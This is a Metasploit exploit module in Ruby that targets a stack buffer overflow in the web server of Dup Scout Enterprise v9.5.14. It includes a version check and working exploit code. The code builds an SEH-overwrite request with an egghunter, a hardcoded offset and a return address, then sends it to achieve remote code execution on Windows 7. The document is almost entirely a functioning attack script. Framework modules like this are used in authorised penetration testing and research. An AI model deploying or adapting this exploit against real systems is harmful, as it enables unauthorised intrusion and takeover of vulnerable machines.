##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Seh
  include Msf::Exploit::Remote::Egghunter
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Dup Scout Enterprise GET Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow vulnerability
        in the web interface of Dup Scout Enterprise v9.5.14, caused by
        improper bounds checking of the request path in HTTP GET requests
        sent to the built-in web server. This module has been tested
        successfully on Windows 7 SP1 x86.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'vportal',	     # Vulnerability discovery and PoC
          'Daniel Teixeira'  # Metasploit module
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'   => "\x00\x09\x0a\x0d\x20\x26",
          'Space'      => 500
        },
      'Targets'        =>
        [
          [ 'Dup Scout Enterprise v9.5.14',
            {
              'Offset' => 2488,
              'Ret'    => 0x10050ff3  # POP # POP # RET [libspp.dll]
            }
          ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Mar 15 2017',
      'DefaultTarget'  => 0))
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => '/'
    )

    if res && res.code == 200
      version = res.body[/Dup Scout Enterprise v[^<]*/]
      if version
        vprint_status("Version detected: #{version}")
        if version =~ /9\.5\.14/
          return Exploit::CheckCode::Appears
        end
        return Exploit::CheckCode::Detected
      end
    else
      vprint_error('Unable to determine due to a HTTP connection timeout')
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Safe
  end

  def exploit

    eggoptions = {
      checksum: true,
      eggtag: rand_text_alpha(4, payload_badchars)
    }

    hunter, egg = generate_egghunter(
      payload.encoded,
      payload_badchars,
      eggoptions
    )

    sploit =  rand_text_alpha(target['Offset'])
    sploit << generate_seh_record(target.ret)
    sploit << hunter
    sploit << make_nops(10)
    sploit << egg
    sploit << rand_text_alpha(5500)

    print_status('Sending request...')

    send_request_cgi(
      'method' => 'GET',
      'uri'    => sploit
    )
  end
end